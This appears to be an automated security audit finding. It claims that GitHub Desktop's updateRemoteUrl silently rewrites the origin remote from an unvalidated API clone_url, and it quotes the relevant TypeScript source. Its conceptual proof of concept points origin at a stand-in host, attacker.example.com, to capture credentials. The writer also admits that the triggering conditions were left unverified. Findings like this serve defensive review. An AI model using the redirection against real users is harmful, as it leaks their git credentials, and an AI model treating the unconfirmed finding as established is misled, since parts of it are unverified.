### Title
Silent, unvalidated remote URL rewrite from GitHub API `clone_url` can redirect pushes/fetches (and credentials) to an attacker-controlled host - (File: `app/src/lib/stores/updates/update-remote-url.ts`)

### Summary
The external report's core pattern is "a value coming from an external/untrusted source is used to perform a sensitive operation (a transfer) without a `require`/validation guard that a related invariant holds." The closest structural analog in GitHub Desktop is `updateRemoteUrl()`, which takes `apiRepo.clone_url` — a field returned by the GitHub API (an attacker-influenceable object per the allowed threat model) — and uses it to silently rewrite the local repository's `origin` remote URL via `gitStore.setRemoteURL`, with validation that is materially weaker than it appears.

### Finding Description
`updateRemoteUrl` in [1](#0-0)  computes:

- `remoteUrlUnchanged`: whether the *previously cached* `gitHubRepository.cloneURL` still matches the *current* git remote (owner/name/hostname only, via `urlMatchesRemote`).
- `urlsMatch`: whether the *new* `apiRepo.clone_url` already matches the current remote.
- `protocolsMatch`: whether the top-level URL scheme (`https:` vs unparseable/ssh) of old vs new URL agree.

If `protocolsMatch && remoteUrlUnchanged && !urlsMatch`, it calls `gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)`, which shells out to `git remote set-url` [2](#0-1) .

Critically, none of these three checks validate that the **new** `apiRepo.clone_url` points to the same hostname/owner/name as the repository the user actually opened — `urlMatchesRemote` is only used to compare the *old* URL against cached metadata and to detect "no-op" cases, never to constrain what the *new* URL is allowed to be. `parseRemote`/`urlMatchesRemote` in [3](#0-2)  is capable of doing this comparison but is simply never applied to the incoming `clone_url`. As long as the scheme matches (e.g. both `https:`), an arbitrary hostname supplied by the API response for `clone_url` will be written into the user's git config as the new `origin` URL.

### Impact Explanation
This is exactly the "silent corruption of what the user commits or pushes" and "GitHub API object" attacker-primitive class called out as valid: a compromised, MITM'd, or malicious GitHub Enterprise server response can cause Desktop to silently point `origin` at an attacker's git server. Once the remote is rewritten, subsequent `git push`/`git fetch`/`git pull` operations executed through `envForRemoteOperation` (which injects auth env vars per remote, see [4](#0-3) ) will authenticate to the attacker's host, effectively exfiltrating the user's git credentials/token to that host and letting the attacker serve arbitrary refs/objects back as if they were the legitimate repository — corrupting what the user believes they are pushing/pulling without any prompt or confirmation.

### Likelihood Explanation
The GitHub API response object (`IAPIRepository`, specifically `clone_url`) is the described "attacker-controlled GitHub API object" primitive. Reaching this code requires the app to already be tracking a `GitHubRepository` association and to fetch updated repo metadata (e.g. background repository refresh) — a normal, unprompted background flow, not a user-driven action, and not requiring local/physical access, malware, or leaked credentials, satisfying the "Valid Impact" criteria. The main residual uncertainty is the exact upstream call site/frequency of `updateRemoteUrl` in `app-store.ts`, which the current tool budget did not allow me to fully read (only match counts were retrieved, not the surrounding logic) — so the precise triggering conditions (e.g., whether it fires on every background metadata refresh vs. a narrower codepath) remain unverified.

### Recommendation
Before calling `gitStore.setRemoteURL`, validate the new `apiRepo.clone_url` against the expected repository identity using the existing `urlMatchesRemote`/`parseRemote` helpers — i.e., require that the new URL's hostname/owner/name match the `GitHubRepository` record Desktop already has cached (analogous to adding the missing `require` in the reported pattern), and refuse to update (or prompt the user) if it does not.

### Proof of Concept
Conceptual PoC (cannot be executed without a live Desktop instance and controlled/compromised GitHub(Enterprise) API endpoint):
1. Attacker controls or MITMs the API endpoint used for a tracked GitHub Enterprise repository (or compromises the API response in transit).
2. On the next background repository metadata refresh, the API response for the repository includes `clone_url: "https://attacker.example.com/evil/repo.git"`.
3. `updateRemoteUrl` sees `protocolsMatch` (both `https:`), `remoteUrlUnchanged` (cached clone URL still matches local `origin`), and `!urlsMatch` (new URL differs) — all satisfied — and calls `gitStore.setRemoteURL('origin', 'https://attacker.example.com/evil/repo.git')` [5](#0-4)  with no owner/hostname validation against the new URL.
4. The user's next `git push`/`fetch` silently targets `attacker.example.com`, sending credentials configured via `envForRemoteOperation` to the attacker and allowing injection of arbitrary history.

export async function updateRemoteUrl(
  gitStore: GitStore,
  gitHubRepository: GitHubRepository,
  apiRepo: IAPIRepository
): Promise<void> {
  // I'm not sure when these early exit conditions would be met. But when they are
  // we don't have enough information to continue so exit early!
  if (gitStore.defaultRemote === null) {
    return
  }

  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
}

export function urlMatchesRemote(url: string | null, remote: IRemote): boolean {
  if (url == null) {
    return false
  }

  const cloneUrl = parseRemote(url)
  const remoteUrl = parseRemote(remote.url)

  if (remoteUrl == null || cloneUrl == null) {
    return false
  }

  if (!caseInsensitiveEquals(remoteUrl.hostname, cloneUrl.hostname)) {
    return false
  }

  if (remoteUrl.owner == null || cloneUrl.owner == null) {
    return false
  }

  if (remoteUrl.name == null || cloneUrl.name == null) {
    return false
  }

  return (
    caseInsensitiveEquals(remoteUrl.owner, cloneUrl.owner) &&
    caseInsensitiveEquals(remoteUrl.name, cloneUrl.name)
  )
}

/**
 * Create a set of environment variables to use when invoking a Git
 * subcommand that needs to communicate with a remote (i.e. fetch, clone,
 * push, pull, ls-remote, etc etc).
 *
 * The environment variables deal with setting up sane defaults, configuring
 * authentication, and resolving proxy urls if necessary.
 *
 * @param account   The authentication information (if available) to provide
 *                  to Git for use when connecting to the remote
 * @param remoteUrl The primary remote URL for this operation. Note that Git
 *                  might connect to other remotes in order to fulfill the
 *                  operation. As an example, a clone of
 *                  https://github.com/desktop/desktop could contain a submodule
 *                  pointing to another host entirely. Used to resolve which
 *                  proxy (if any) should be used for the operation.

export async function envForRemoteOperation(remoteUrl: string) {
  return {
    ...envForAuthentication(),
    ...(await envForProxy(remoteUrl)),
  }
}
